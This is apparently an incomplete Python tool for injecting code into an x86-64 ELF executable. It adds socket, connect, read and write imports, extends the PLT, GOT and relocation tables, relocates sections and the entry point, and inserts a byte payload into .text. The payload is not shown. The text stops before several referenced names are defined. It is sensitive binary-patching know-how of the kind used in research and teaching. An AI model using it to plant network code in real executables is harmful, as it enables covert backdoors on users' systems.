from elftools import *
from elftools.elf.elffile import ELFFile
from elftools.elf.enums import ENUM_D_TAG_COMMON
from capstone import Cs, CS_ARCH_X86, CS_MODE_64
from iced_x86 import *
import os
import array
import unittest
from capstone import *
import array

# Initialize the Capstone disassembler
md = Cs(CS_ARCH_X86, CS_MODE_64)

modifications = [] # contains 
offsets = [] # offsets of what to change

# Overwrites file with data at given offset
def modify_file(offset,data):
    FILE.seek(offset)
    FILE.write(data)

# Reads file as bytes
def read_elf_file(file_path):
    with open(file_path, 'rb') as file:
        return file.read()

# Writes bytes to file
def write_elf_file(data, file_path):
    with open(file_path, 'wb') as file:
        file.write(data)

# Inserts bytes at a specified offset in file
def insert_bytes_in_elf(elf_bytes, offset, bytes_to_insert):
    elf_bytearray = bytearray(elf_bytes)
    
    if offset >= len(elf_bytearray):
        raise ValueError(f"Offset {offset} is out of bounds for the ELF file.")
    
    elf_bytearray[offset:offset] = bytes_to_insert
    
    return bytes(elf_bytearray)

# Given an array of bytes and an array of sizes of equal size adds these to file
def add_contents_to_file(offset,array_contents,array_sizes):
    for i in range(len(array_contents)):
        elf_bytes = read_elf_file(FILE_NAME)
        modified_elf_bytes = insert_bytes_in_elf(elf_bytes, offset, array_contents[i].to_bytes(array_sizes[i],'little'))
        offset+=array_sizes[i]
        # Write the modified ELF bytes back to the file
        write_elf_file(modified_elf_bytes, FILE_NAME)

sym_versions = [2,2,2,2,2,3,2,2] # Versions of below symbols
symbol_names = [  "memset", "close", "read","connect","socket", "__stack_chk_fail","write","strlen"]
GLIBC_versions = ["GLIBC_2.2.5","GLIBC_2.4"] # strings of versions
string_names = [ "memset", "close", "read", "connect","socket", "__stack_chk_fail","write","strlen","GLIBC_2.2.5", "GLIBC_2.4"]
str_tab_entries = [] # strings of above string_names layed out byte by byte (computed later)


DYN_SYM_SYMBOL_NAMES = []
# Gets the index of symbol in the dynamic symbol table
def get_index_of_symbol_in_dyn_sym(symbol_name):
    if symbol_name in DYN_SYM_SYMBOL_NAMES:
        return DYN_SYM_SYMBOL_NAMES.index(symbol_name)
    return len(DYN_SYM_SYMBOL_NAMES) + symbol_names.index(symbol_name)

# Determines if symbols and versions are already present in file
def check_duplicate_symbols_and_versions():
    ## Versions
    print(GNU_VERSION_R_SECTION.get_version(2)[1].entry)
    if GNU_VERSION_R_SECTION.get_version(2) is not None:
        GLIBC_versions.remove(GNU_VERSION_R_SECTION.get_version(2)[1].name)
        string_names.remove(GNU_VERSION_R_SECTION.get_version(2)[1].name)
    if GNU_VERSION_R_SECTION.get_version(3) is not None:
        GLIBC_versions.remove(GNU_VERSION_R_SECTION.get_version(3)[1].name)
        string_names.remove(GNU_VERSION_R_SECTION.get_version(3)[1].name)

    ## Symbols
    for i in range(DYN_SYM_NUM_SYMBOLS):
        if DYN_SYM_SECTION.get_symbol(i).name in symbol_names:
            del sym_versions[(symbol_names.index(DYN_SYM_SECTION.get_symbol(i).name))]
            symbol_names.remove(DYN_SYM_SECTION.get_symbol(i).name)
            string_names.remove(DYN_SYM_SECTION.get_symbol(i).name)

# converts string names into a list of bytes (NULL-terminated)
def convert_functions_to_str_tab_entry():
    for symbol in string_names:
        for letter in symbol:
            str_tab_entries.append(ord(letter))
        str_tab_entries.append(0x0)

# gets index of string starting byte within str_tab_entries
def get_str_index_of_added_str(str_name):
    sym_name_index = string_names.index(str_name)
    index = DYN_STR_INJECT_OFFSET - DYN_STR_OFFSET
    for i in range(sym_name_index):
        index = index + len(string_names[i]) + 1
    return index

# Edits the file offset and virtual address of a section
def edit_elf_section(elf_section,section_index,size):   

    total_section_addr_offset = SECTION_HEADER_TABLE_OFFSET + SECTION_HEADER_TABLE_ENTRY_SIZE * section_index + SECTION_HEADER_VIRTUAL_ADDRESS_STRUCT_OFFSET
    total_section_offset_offset = SECTION_HEADER_TABLE_OFFSET + SECTION_HEADER_TABLE_ENTRY_SIZE * section_index + SECTION_HEADER_FILE_OFFSET_STRUCT_OFFSET
    section_offset = elf_section['sh_offset'] 
    section_addr = elf_section['sh_addr']

    modify_file(total_section_offset_offset,(size + section_offset).to_bytes(8,'little'))
    modify_file(total_section_addr_offset,(size + section_addr).to_bytes(8,'little'))

# Edits all elf sections
def edit_elf_sections():
    for i in range(NUM_SECTIONS):
        size = get_total_increased_offset(SECTION_INDICES,i,ELF_SECTIONS_ALIGNMENT_SIZES)
        edit_elf_section(ELF.get_section(i),i,size)

# Changes all sizes of injected sections
def edit_sections_changes_sizes():
    for i in range(len(ELF_SECTIONS_CHANGES)):
        section_size = ELF.get_section_by_name(ELF_SECTIONS_CHANGES[i])['sh_size']
        total_section_size_offset = SECTION_HEADER_TABLE_OFFSET + SECTION_HEADER_TABLE_ENTRY_SIZE * ELF.get_section_index(ELF_SECTIONS_CHANGES[i]) + SECTION_FILE_OFFSET_STRUCT_OFFSET
        modify_file(total_section_size_offset,(section_size+ELF_SECTIONS_INJECT_SIZES[i]).to_bytes(8,'little'))

# Aligns the values of symbols to match their new virtual address 
def edit_symbol_table():

    for i in range(NUM_SYMBOLS):
        sym_value = SYM_TAB_SECTION.get_symbol(i)['st_value']

        section_index = get_section_index_of_virtual_offset(sym_value)
        # sym_value should be a valid virtual address in a segment
        if section_index is None:
            continue
        new_offset = calc_new_offset(sym_value,section_index)
        modify_file(SYM_TAB_OFFSET + SYM_TAB_ENTRY_SIZE * i + SYM_TAB_VALUE_STRUCT_OFFSET,(new_offset).to_bytes(8,'little'))

# Edits certain dynamic section tags
def edit_dynamic_section():
    #print("-------EDITING DYNAMIC SECTION--------")
    for i in range(DYNAMIC_SECTION.num_tags()):
        tag = DYNAMIC_SECTION._get_tag(i)
        tag_value = tag['d_ptr']
        d_tag = tag['d_tag']
        new_value = 0x0
        unchanged = ['DT_NULL','DT_NEEDED','DT_RELAENT','DT_SYMENT','DT_INIT_ARRAYSZ','DT_FINI_ARRAYSZ','DT_DEBUG','DT_FLAGS','DT_FLAGS_1','DT_PLTREL','DT_RELACOUNT','DT_RELASZ']
        if (d_tag in unchanged):
            continue
        elif (d_tag == 'DT_STRSZ'):
            new_value = tag_value + len(str_tab_entries)
        elif (d_tag == 'DT_PLTRELSZ'):
            rela_plt_entry_size = 24
            new_value = len(symbol_names) * rela_plt_entry_size + tag_value
        elif (d_tag == 'DT_VERNEEDNUM'):
            new_value = NUM_VERSIONS + len(GLIBC_versions) 
        else:
            virtual_offset = get_section_index_of_virtual_offset(tag_value)
            new_value = get_total_increased_offset(SECTION_INDICES,virtual_offset,ELF_SECTIONS_ALIGNMENT_SIZES) + tag_value
        
        modify_file(DYNAMIC_SECTION_OFFSET + DYNAMIC_SECTION_ENTRY_SIZE * i + DYNAMIC_SECTION_VALUE_STRUCT_OFFSET,(new_value).to_bytes(8,'little'))

# Edits the entries' virtual addresses in rela.dyn
def edit_rela_dyn_section():

    relocation_offset = RELA_DYN_SECTION_OFFSET
    for i in range(RELA_DYN_NUM_RELOCATIONS):

        rela_dyn_relocation_offset = RELA_DYN_SECTION.get_relocation(i)['r_offset']
        section_index = get_section_index_of_virtual_offset(rela_dyn_relocation_offset)
        new_offset = calc_new_offset(rela_dyn_relocation_offset,section_index)
        
        modify_file(relocation_offset,(new_offset).to_bytes(8,'little'))
        relocation_offset = relocation_offset + RELA_DYN_ENTRY_SIZE
        
        if RELA_DYN_SECTION.get_relocation(i)['r_info'] != RELATIVE_TYPE:
            continue
        
        relocation_addend = RELA_DYN_SECTION.get_relocation(i)['r_addend']
        section_index = get_section_index_of_virtual_offset(relocation_addend)
        new_offset = calc_new_offset(relocation_addend,section_index)

        modify_file(RELA_DYN_SECTION_OFFSET + i * RELA_DYN_ENTRY_SIZE + RELA_DYN_ADDEND_STRUCT_OFFSET,(new_offset).to_bytes(8,'little'))

# Changes the number of required versions 
def edit_gnu_version_r_section():
    additional_versions = len(GLIBC_versions)
    cnt_offset = 2
    modify_file(GNU_VERSION_R_OFFSET+cnt_offset,(NUM_VERSIONS+additional_versions).to_bytes(2,'little'))

def edit_rela_plt_section():

    rela_plt_relocation_entry_offset = RELA_PLT_OFFSET

    for i in range(RELA_PLT_NUM_RELOCATIONS):
        relocation_offset = RELA_PLT_SECTION.get_relocation(i)['r_offset']
        section_index = get_section_index_of_virtual_offset(relocation_offset)
        new_offset = calc_new_offset(relocation_offset,section_index)
        
        modify_file(rela_plt_relocation_entry_offset,(new_offset).to_bytes(8,'little'))
        rela_plt_relocation_entry_offset = rela_plt_relocation_entry_offset + RELA_PLT_ENTRY_SIZE

def edit_entry_point():
    section_index = get_section_index_of_virtual_offset(ENTRY_POINT)
    new_offset = calc_new_offset(ENTRY_POINT,section_index)
    print("NEW ENTRY POINT:",hex(new_offset))
    modify_file(ENTRY_POINT_STRUCT_OFFSET,(new_offset).to_bytes(8,'little'))

# Calculates the increased the size of segments given the sections injected into
def get_program_header_increased_size(indices,offset,p_header_size,section_sizes):
    total_size = 0
    for i in range(len(indices)):
        if indices[i] >= offset and indices[i] < offset + p_header_size:
            total_size+=section_sizes[i]
    return total_size
    
# Edits the file size, memory size, file offset, virtual address, and physical address of segment
def edit_program_header():
    for i in range(NUM_SEGMENTS):
        segment = ELF.get_segment(i)
        segment_offset = PROGRAM_HEADER_OFFSET + i * PROGRAM_HEADER_ENTRY_SIZE
        seg_inject_size = get_program_header_increased_size(SECTIONS_OFFSETS,segment['p_offset'],segment['p_filesz'],ELF_SECTIONS_ALIGNMENT_SIZES)

        modify_file(segment_offset + PROGRAM_HEADER_FILESZ_STRUCT_OFFSET,(segment['p_filesz']+seg_inject_size).to_bytes(8,'little'))
        modify_file(segment_offset + PROGRAM_HEADER_MEMSZ_STRUCT_OFFSET,(segment['p_memsz']+seg_inject_size).to_bytes(8,'little'))

        increased_offset = get_total_increased_offset(SECTIONS_OFFSETS,segment['p_offset'],ELF_SECTIONS_ALIGNMENT_SIZES)
        #print("SEGMENT INCREASED OFFSET:",increased_offset)
        modify_file(segment_offset + PROGRAM_HEADER_FILE_OFFSET_STRUCT_OFFSET,(segment['p_offset']+increased_offset).to_bytes(8,'little'))
        modify_file(segment_offset + PROGRAM_HEADER_VIRTUAL_ADDRESS_STRUCT_OFFSET,(segment['p_vaddr']+increased_offset).to_bytes(8,'little'))
        modify_file(segment_offset + PROGRAM_HEADER_PHYSICAL_ADDRESS_STRUCT_OFFSET,(segment['p_paddr']+increased_offset).to_bytes(8,'little'))


def add_functions_to_plt_sec():
    sizes = [4,3,4,5]
    assert sum(sizes) * len(symbol_names) == PLT_SEC_INJECT_SIZE, "values not equal"
    endbr64 = 0xfa1e0ff3
    jmp = 0x25fff2
    nopl = 0x0000441f0f

    section_index = get_section_index_of_offset(GOT_OFFSET)
    got_new_offset = calc_new_offset(GOT_INJECT_OFFSET,section_index)
    
    section_index = get_section_index_of_offset(PLT_SEC_OFFSET)
    plt_sec_new_offset = calc_new_offset(PLT_SEC_INJECT_OFFSET,section_index) + 0xb
    # 0xb is the distance from the start of the pltsec entry to the rip that is used for calculating relative offset

    inject_offset = PLT_SEC_INJECT_OFFSET
    for i in range(len(symbol_names)):
        jmp_offset = got_new_offset + GOT_VIRTUAL_ADDRESS_CHANGE - plt_sec_new_offset
        add_contents_to_file(inject_offset,[endbr64,jmp,jmp_offset,nopl],sizes)
        inject_offset+= sum(sizes)
        plt_sec_new_offset += sum(sizes)
        got_new_offset = got_new_offset + GOT_ENTRY_SIZE
    num_bytes_to_align = PLT_SEC_ALIGNMENT_SIZE - PLT_SEC_INJECT_SIZE
    if num_bytes_to_align > 0:
        align_section(inject_offset,num_bytes_to_align)

def add_functions_to_plt():
    sizes = [4,1,4,2,4,1]
    assert sum(sizes) * len(symbol_names) == PLT_INJECT_SIZE, "values not equal"
    endbr64 = 0xfa1e0ff3
    jmp = 0xe9f2
    nop = 0x90
    push = 0x68
    push_val = PLT_NUM_RELOCTIONS
    jmp_offset = 0xffffffe1 - 16 * push_val
    inject_offset = PLT_INJECT_OFFSET
    for i in range(len(symbol_names)):
        add_contents_to_file(inject_offset,[endbr64,push,push_val,jmp,jmp_offset,nop],sizes)
        inject_offset+= sum(sizes)
        push_val = push_val + 1
        jmp_offset = jmp_offset - 16
    num_bytes_to_align = PLT_ALIGNMENT_SIZE - PLT_INJECT_SIZE
    if num_bytes_to_align > 0:
        align_section(inject_offset,num_bytes_to_align)

# Adds versions to gnu.version section which correspond to the versions of relocatable objects
def add_versions_to_gnu_version():
    sizes = []
    for i in sym_versions:
        sizes.append(2)
    assert sum(sizes) == GNU_VERSION_INJECT_SIZE, "Values are not equal"
    inject_offset = GNU_VERSION_INJECT_OFFSET
    add_contents_to_file(inject_offset,sym_versions,sizes)
    inject_offset = inject_offset + sum(sizes)
    num_bytes_to_align = GNU_VERSION_ALIGNMENT_SIZE - GNU_VERSION_INJECT_SIZE
    if num_bytes_to_align > 0:
        align_section(inject_offset,num_bytes_to_align)

# Adds computed strings to the dynamic string table
def add_strings_to_dyn_str_tab():
    sizes = []
    for i in str_tab_entries:
        sizes.append(1)
    assert sum(sizes) == DYN_STR_INJECT_SIZE, "Values are not equal"
    add_contents_to_file(DYN_STR_INJECT_OFFSET,str_tab_entries,sizes)
    align_offset = DYN_STR_INJECT_OFFSET + sum(sizes)
    num_bytes_to_align = DYN_STR_ALIGNMENT_SIZE - DYN_STR_INJECT_SIZE
    if num_bytes_to_align > 0:
        align_section(align_offset,num_bytes_to_align)

# Adds function entries to symbol table
def add_functions_to_sym_tab():

    sizes = [4,1,1,2,8,8]
    inject_offset = SYM_TAB_INJECT_OFFSET
    assert sum(sizes) * len(symbol_names) == SYM_TAB_INJECT_SIZE, "values are not equal"
    for i in range(len(symbol_names)):
        name = 0x0
        add_contents_to_file(inject_offset,[name,0x12,0x0,0x0,0x0,0x0],sizes)
        inject_offset+= SYM_TAB_ENTRY_SIZE
    num_bytes_to_align = SYM_TAB_ALIGNMENT_SIZE - SYM_TAB_INJECT_SIZE
    if num_bytes_to_align > 0:
        align_section(inject_offset,num_bytes_to_align)

# Adds function entries to dynamic symbol table
def add_functions_to_dyn_sym():

    sizes = [4,1,1,2,8,8]
    inject_offset = DYN_SYM_INJECT_OFFSET

    assert len(symbol_names) * sum(sizes) == DYN_SYM_INJECT_SIZE, "values not equal"
    for i in range(len(symbol_names)):
        name = get_str_index_of_added_str(symbol_names[i])

        add_contents_to_file(inject_offset,[name,0x12,0x0,0x0,0x0,0x0],sizes)
        inject_offset+= DYN_SYM_ENTRY_SIZE
    num_bytes_to_align = DYN_SYM_ALIGNMENT_SIZE - DYN_SYM_INJECT_SIZE
    if num_bytes_to_align > 0:
        align_section(inject_offset,num_bytes_to_align)

# Adds functions to .rela.plt section
def add_functions_to_rela_plt():

    section_index = get_section_index_of_offset(GOT_OFFSET)
    got_new_offset = calc_new_offset(GOT_INJECT_OFFSET,section_index)
    sizes = [8,8,8]
    inject_offset = RELA_PLT_INJECT_OFFSET
    assert sum(sizes) * len(symbol_names) == RELA_PLT_INJECT_SIZE, "values not equal"
    for i in range(len(symbol_names)):
        index = get_index_of_symbol_in_dyn_sym(symbol_names[i])
        info = index * 0x100000000 + 0x7
        rela_offset = got_new_offset + GOT_VIRTUAL_ADDRESS_CHANGE
        add_contents_to_file(inject_offset,[rela_offset,info,0x0],sizes)

        got_new_offset = got_new_offset + GOT_ENTRY_SIZE
        inject_offset+= RELA_PLT_ENTRY_SIZE
    
    num_bytes_to_align = RELA_PLT_ALIGNMENT_SIZE - RELA_PLT_INJECT_SIZE
    if num_bytes_to_align > 0:
        align_section(inject_offset,num_bytes_to_align)

# Adds required versions to .gnu.version_r
def add_versions_to_gnu_version_r():
    verneed_size = 16
    sizes = [4,2,2,4,4]
    assert sum(sizes) == GNU_VERSION_R_INJECT_SIZE, "values not equal"
    
    flags = 0x0
    next = 0x10

    if "GLIBC_2.4" in GLIBC_versions:
        GLIBC_2_4_name = get_str_index_of_added_str("GLIBC_2.4")
        version = 0x3
        hash = 0x0d696914
        GLIBC_2_4 =  [hash,flags,version,GLIBC_2_4_name,next]

        add_contents_to_file(GNU_VERSION_R_INJECT_OFFSET,GLIBC_2_4,sizes)
    
    if "GLIBC_2.2.5" in GLIBC_versions:
        GLIBC_2_2_5_name = get_str_index_of_added_str("GLIBC_2.2.5")
        version = 0x2
        hash = 0x751a6909
        GLIBC_2_2_5 =  [hash,flags,version,GLIBC_2_2_5_name,next]

        add_contents_to_file(GNU_VERSION_R_INJECT_OFFSET,GLIBC_2_2_5,sizes)
    
    num_bytes_to_align = GNU_VERSION_R_ALIGNMENT_SIZE - GNU_VERSION_R_INJECT_SIZE
    if num_bytes_to_align > 0:
        align_section(GNU_VERSION_R_INJECT_OFFSET + verneed_size* (NUM_VERSIONS+len(GLIBC_versions)),num_bytes_to_align)

## size of got = 8 * (num rela.dyn + num rela.plt)
## size of .plt = 16 * (num rela.plt) + 16
def add_functions_to_got():
    sizes = [8]

    section_index = get_section_index_of_offset(PLT_SEC_OFFSET)
    plt_sec_new_inject_offset = calc_new_offset(PLT_SEC_INJECT_OFFSET,section_index)
    assert sum(sizes) * len(symbol_names) == GOT_INJECT_SIZE, "values not equal"
    inject_offset = GOT_INJECT_OFFSET
    print("adding functions to GOT starting at plt_sec_inject_offset:",hex(plt_sec_new_inject_offset))
    for i in range(len(symbol_names)):
        add_contents_to_file(inject_offset,[plt_sec_new_inject_offset],sizes)
        plt_sec_new_inject_offset = plt_sec_new_inject_offset + PLT_SEC_ENTRY_SIZE
        inject_offset+= sum(sizes)
    num_bytes_to_align = GOT_ALIGNMENT_SIZE - GOT_INJECT_SIZE
    if num_bytes_to_align > 0:
        align_section(inject_offset,num_bytes_to_align)


# Gets the increased offset given:
#  1. indices of sections and index
#  OR
#  2. offests of sections and offset
def get_total_increased_offset(indices,index,sizes):
    size = 0
    for j in range(len(indices)):
        if index > indices[j]:
            size+=sizes[j]
    return size

# Determines the section index the offset is in
def get_section_index_of_offset(offset):
    for i in range(NUM_SECTIONS):
        section = SECTIONS[i]
        if offset >=section['sh_offset'] and offset < (section['sh_offset'] + section['sh_size']):
            return i
    return None

# Calculates the difference in the program segment between file offset and virtual address
def file_offset_to_virtual_address_shift_ammount(offset):
    section_index = get_section_index_of_offset(offset)

    section = ELF.get_section(section_index)
    for i in range(ELF.num_segments()):
        segment = ELF.get_segment(i)
        if segment.section_in_segment(section):
            return segment['p_vaddr']-segment['p_offset']
    return None

# Given a virtual address determine what section index this belongs to
def get_section_index_of_virtual_offset(offset):
    for i in range(NUM_SEGMENTS):
        segment = ELF.get_segment(i)
        if offset >= segment['p_vaddr'] and offset < (segment['p_vaddr'] + segment['p_memsz']):
            offset = offset - (segment['p_vaddr'] - segment['p_offset'])
            return get_section_index_of_offset(offset)
    return None

# Given the old offset gets the new offset after injections
def calc_new_offset(old_offset,section_index):
    new_offset = old_offset
    for j in range(len(SECTION_INDICES)):
        if section_index > SECTION_INDICES[j]:
            new_offset+=ELF_SECTIONS_ALIGNMENT_SIZES[j]
    return new_offset


# Gets indices of the sections to be changed
def get_indices_of_sections():
    indices = []
    for i in range(len(ELF_SECTIONS_CHANGES)):
        indices.append(ELF.get_section_index(ELF_SECTIONS_CHANGES[i]))
    return indices

# Pads 0x00 bytes at given offset
def align_section(offset,num_bytes):
    sizes = []
    bytes_to_add = []
    for i in range(num_bytes):
        sizes.append(1)
        bytes_to_add.append(0x0)
    add_contents_to_file(offset,bytes_to_add,sizes)

# Aligns the inject sizes so that they are a multiple of 16
def align_offsets():
    aligned_sizes = []
    for i in range(len(ELF_SECTIONS_CHANGES)):
        index = ELF.get_section_index(ELF_SECTIONS_CHANGES[i])
        next_section_index = index + 1
        #xxx4 xxxx8
        size = ELF_SECTIONS_INJECT_SIZES[i]
        section_offset = ELF.get_section(next_section_index)['sh_offset']
        length_to_next_section = size + ELF.get_section_by_name(ELF_SECTIONS_CHANGES[i])['sh_offset']
        while (length_to_next_section % 16) != (section_offset % 16):
            length_to_next_section = length_to_next_section + 1
            size = size + 1
        aligned_sizes.append(ELF_SECTIONS_INJECT_SIZES[i] + 16 - (ELF_SECTIONS_INJECT_SIZES[i] % 16))
    return aligned_sizes

def get_alignment_size(section_name):
    return ELF_SECTIONS_ALIGNMENT_SIZES[ELF_SECTIONS_CHANGES.index(section_name)]



# Determines if the offset is an entry in a relocation section
def offset_in_rela(offset):
    for i in range(RELA_DYN_NUM_RELOCATIONS):
        if offset == RELA_DYN_SECTION.get_relocation(i)['r_offset'] and RELA_DYN_SECTION.get_relocation(i)['r_info'] != RELATIVE_TYPE:
            return True
    for i in range(RELA_PLT_NUM_RELOCATIONS):
        if offset == RELA_PLT_SECTION.get_relocation(i)['r_offset']:
            return True
    return False

def edit_text_section(inject_offset,size):
    section_header_table = ELF['e_shoff']
    section_header_size = ELF['e_shentsize']
    section_size_offset = 32
    text_index = 16
    text_section = ELF.get_section_by_name(".text")
    text_section_size = text_section['sh_size']
    total_section_size_offset = section_header_table + section_header_size * text_index + section_size_offset
    modify_file(total_section_size_offset,(text_section_size+size).to_bytes(8,'little'))


    program_header_offset = ELF['e_phoff']
    num_segments = ELF.num_segments()
    filesz_offset = 32
    memsz_offset = 40
    filesz_offset = 32
    memsz_offset = 40
    header_size = ELF['e_phentsize']
    for i in range(num_segments):
        segment = ELF.get_segment(i)
        start = segment['p_offset']
        end = start + segment['p_filesz']
        if inject_offset >= start and inject_offset < end:
            modify_file(program_header_offset + i * header_size + filesz_offset,(segment['p_filesz']+size).to_bytes(8,'little'))
            modify_file(program_header_offset + i * header_size + memsz_offset,(segment['p_memsz']+size).to_bytes(8,'little'))


def edit_code_section(section_offset,section_size):
    inject_offset = 0x0
    size = 0x0

    start = section_offset
    end = section_offset + section_size
    section_index = get_section_index_of_offset(start)
    new_section_offset = calc_new_offset(start,section_index)
    print("Start of section: ",hex(new_section_offset))
    FILE.seek(start)  # Move the file pointer to the starting offset
    code = FILE.read(end - start)
    decoder = Decoder(64, code, ip=start)
    formatter = Formatter(FormatterSyntax.NASM)
    for instr in decoder:
        #print(instr)
        disasm = formatter.format(instr)

        rel_mem = instr.ip_rel_memory_address
        next_ip = instr.ip + instr.len

        operand = rel_mem - next_ip
        instruction_length = instr.len
        start_index = instr.ip
        if instr.is_call_near:
            rel_mem = instr.memory_displacement
            print(hex(instr.ip),hex(instr.memory_displacement))
        if not (instr.is_ip_rel_memory_operand or instr.is_call_near):
            continue
        #print(hex(instr.ip),instr,hex(rel_mem))
        end_index = start_index + instruction_length
        instruction_bytes = code[start_index-start:end_index-start]

        section_index_rel_mem = get_section_index_of_virtual_offset(rel_mem)
        section_index_rip = get_section_index_of_virtual_offset(instr.ip)
        #increased distance between current location and rel mem
        increased_size = (calc_new_offset(rel_mem,section_index_rel_mem) - rel_mem) - (calc_new_offset(instr.ip,section_index_rip) - instr.ip)
        #print(hex(instr.ip),instr,'INCREASED SIZE',hex(increased_size))
        if instr.is_call_near:
            print(hex(instr.ip),instr,'INCREASED SIZE',hex(increased_size))
        
        searching_bytes = operand.to_bytes(4, byteorder='little',signed=True)
        hex_code = ' '.join(f'{byte:02X}' for byte in instruction_bytes)
        hex_bytes = bytes.fromhex(hex_code)
        try:
            instruction_offset = instr.ip + hex_bytes.index(searching_bytes)
        except:
            continue
            #print(hex(instruction_offset))
            #modify_file(instruction_offset,(rel_mem - next_ip + increased_size).to_bytes(4,'little',signed=True))
        modify_file(instruction_offset,(rel_mem - next_ip + increased_size if instr.ip < rel_mem else rel_mem - next_ip + increased_size).to_bytes(4,'little',signed=True))
            #print(hex(instr.ip),"|",disasm,hex(rel_mem),"|"," Next instruction: ",hex(next_ip),"|"," Operand ",hex(rel_mem - next_ip)," | Memory offset",hex(instruction_offset)," | Hex Code: ",hex_code)

def edit_text_section_calls():
    
    for i in range(NUM_SEGMENTS):
        if ELF.get_segment(i)['p_flags'] & 0x1 == 1:
            offset = ELF.get_segment(i)['p_offset']
            end = offset + ELF.get_segment(i)['p_filesz']
            for i in range(NUM_SECTIONS):
                if ELF.get_section(i)['sh_offset'] >= offset and ELF.get_section(i)['sh_offset'] < end:
                    edit_code_section(ELF.get_section(i)['sh_offset'],ELF.get_section(i)['sh_size'])


def inject_code():
    sizes = []
    total_length = len(inject) + len(call_inject_indices) * 3
    print("TOTAL LENGTH",total_length)
    i = 0
    print("index:",hex(inject.index(0x11223344)))

    my_indices = [index for index, value in enumerate(inject) if value == 0x11223344]

    for num in my_indices:
        print("INDEX:",hex(num))
    while i < len(inject) + len(call_inject_indices) * 3:
        #print(hex(i))
        if i in call_inject_indices:
            sizes.append(4)
            i = i + 3
        else:
            sizes.append(1)
        i = i + 1 
    print(sum(sizes))
    add_contents_to_file(TEXT_INJECT_OFFSET,inject,sizes)

    num_bytes_to_align = TEXT_ALIGNMENT_SIZE - TEXT_INJECT_SIZE
    if num_bytes_to_align > 0:
        align_section(TEXT_INJECT_OFFSET+TEXT_INJECT_SIZE,num_bytes_to_align)

## START

FILE_NAME = 'hello'
FILE = open(FILE_NAME,'r+b')
ELF = ELFFile(open(FILE_NAME,'rb'))

GNU_VERSION_R_SECTION = ELF.get_section_by_name(".gnu.version_r")
DYN_SYM_SECTION = ELF.get_section_by_name(".dynsym")
DYN_SYM_NUM_SYMBOLS = DYN_SYM_SECTION.num_symbols()

check_duplicate_symbols_and_versions()
convert_functions_to_str_tab_entry()


NUM_SECTIONS = ELF.num_sections()
SECTIONS = []
for i in range(NUM_SECTIONS):
    SECTIONS.append(ELF.get_section(i))

SECTION_HEADER_TABLE_OFFSET = ELF['e_shoff']
SECTION_HEADER_TABLE_ENTRY_SIZE = ELF['e_shentsize']
SECTION_HEADER_FILE_OFFSET_STRUCT_OFFSET = 24
SECTION_HEADER_VIRTUAL_ADDRESS_STRUCT_OFFSET = 16

PROGRAM_HEADER_OFFSET = ELF['e_phoff']
NUM_SEGMENTS = ELF.num_segments()
PROGRAM_HEADER_FILE_OFFSET_STRUCT_OFFSET = 8
PROGRAM_HEADER_FILESZ_STRUCT_OFFSET = 32
PROGRAM_HEADER_MEMSZ_STRUCT_OFFSET = 40
PROGRAM_HEADER_VIRTUAL_ADDRESS_STRUCT_OFFSET = 16
PROGRAM_HEADER_PHYSICAL_ADDRESS_STRUCT_OFFSET = 24
PROGRAM_HEADER_ENTRY_SIZE = ELF['e_phentsize']

SECTION_FILE_OFFSET_STRUCT_OFFSET = 32


DYNAMIC_SECTION = ELF.get_section_by_name(".dynamic")
DYNAMIC_SECTION_ENTRY_SIZE = DYNAMIC_SECTION['sh_entsize']
DYNAMIC_SECTION_OFFSET = DYNAMIC_SECTION['sh_offset']
DYNAMIC_SECTION_VALUE_STRUCT_OFFSET = 8

ENTRY_POINT = ELF['e_entry']
ENTRY_POINT_STRUCT_OFFSET = 24

RELA_DYN_SECTION = ELF.get_section_by_name(".rela.dyn")
RELA_DYN_SECTION_OFFSET = RELA_DYN_SECTION['sh_offset']
RELA_DYN_ENTRY_SIZE = RELA_DYN_SECTION['sh_entsize']
RELA_DYN_NUM_RELOCATIONS = RELA_DYN_SECTION.num_relocations()
RELATIVE_TYPE = 8
RELA_DYN_ADDEND_STRUCT_OFFSET = 16

#.plt.sec
section = ELF.get_section_by_name(".plt.sec")
PLT_SEC_INJECT_OFFSET = section['sh_offset'] + section['sh_size']
PLT_SEC_ENTRY_SIZE = section['sh_entsize']
PLT_SEC_INJECT_SIZE = len(symbol_names) * PLT_SEC_ENTRY_SIZE
PLT_SEC_OFFSET = section['sh_offset']
#.plt
section = ELF.get_section_by_name(".plt")
PLT_INJECT_OFFSET = section['sh_offset'] + section['sh_size']
PLT_ENTRY_SIZE = section['sh_entsize']
PLT_OFFSET = section['sh_offset']
PLT_INJECT_SIZE = len(symbol_names) * PLT_ENTRY_SIZE
PLT_NUM_RELOCTIONS = ELF.get_section_by_name(".rela.plt").num_relocations()

#.got
section = ELF.get_section_by_name(".got")
GOT_INJECT_OFFSET = section['sh_offset'] + section['sh_size']
GOT_ENTRY_SIZE = section['sh_entsize']
GOT_OFFSET = section['sh_offset']
GOT_INJECT_SIZE = GOT_ENTRY_SIZE * len(symbol_names)
GOT_VIRTUAL_ADDRESS_CHANGE = file_offset_to_virtual_address_shift_ammount(GOT_OFFSET)

#.gnu.version
section = ELF.get_section_by_name(".gnu.version")
GNU_VERSION_INJECT_OFFSET = section['sh_offset'] + section['sh_size']
GNU_VERSION_ENTRY_SIZE = section['sh_entsize']
GNU_VERSION_INJECT_SIZE = len(sym_versions) * GNU_VERSION_ENTRY_SIZE
#.gnu.version_r
GNU_VERSION_R_HEADER_SIZE = 16
GNU_VERSION_R_INJECT_OFFSET = GNU_VERSION_R_SECTION['sh_offset'] + GNU_VERSION_R_HEADER_SIZE
GNU_VERSION_R_INJECT_SIZE = 16 * len(GLIBC_versions)
NUM_VERSIONS = GNU_VERSION_R_SECTION.num_versions()
#.symtab
SYM_TAB_SECTION = ELF.get_section_by_name(".symtab")
SYM_TAB_VALUE_STRUCT_OFFSET = 8
NUM_SYMBOLS = SYM_TAB_SECTION.num_symbols()
SYM_TAB_ENTRY_SIZE = 24
if section is not None:
    SYM_TAB_INJECT_OFFSET = SYM_TAB_SECTION['sh_offset'] + SYM_TAB_SECTION['sh_size'] #where the end of symble table is
    SYM_TAB_INJECT_SIZE = len(symbol_names) * SYM_TAB_SECTION['sh_entsize'] #size of functions of add
    SYM_TAB_OFFSET = SYM_TAB_SECTION['sh_offset']
    SYM_TAB_ENTRY_SIZE = SYM_TAB_SECTION['sh_entsize']
#.rela.plt
RELA_PLT_SECTION = ELF.get_section_by_name(".rela.plt")
RELA_PLT_INJECT_OFFSET = RELA_PLT_SECTION['sh_offset'] + RELA_PLT_SECTION['sh_size']
RELA_PLT_ENTRY_SIZE = RELA_PLT_SECTION['sh_entsize']
